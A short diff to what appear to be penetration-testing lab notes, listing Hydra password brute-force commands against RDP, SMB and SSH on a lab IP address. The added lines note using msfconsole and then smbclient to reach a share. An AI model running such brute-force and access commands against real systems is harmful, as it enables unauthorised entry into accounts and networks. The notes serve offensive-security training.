@@ -140,6 +140,8 @@ hydra -L user.list -P password.list rdp://10.129.42.197
 
 # Hydra SMB
 hydra -L user.list -P password.list smb://10.129.42.197
+Had to finish using msfconsole
+then > smbclient -U user \\\\10.129.42.197\\SHARENAME
 
 # Hydra SSH
 hydra -L user.list -P password.list ssh://10.129.42.197
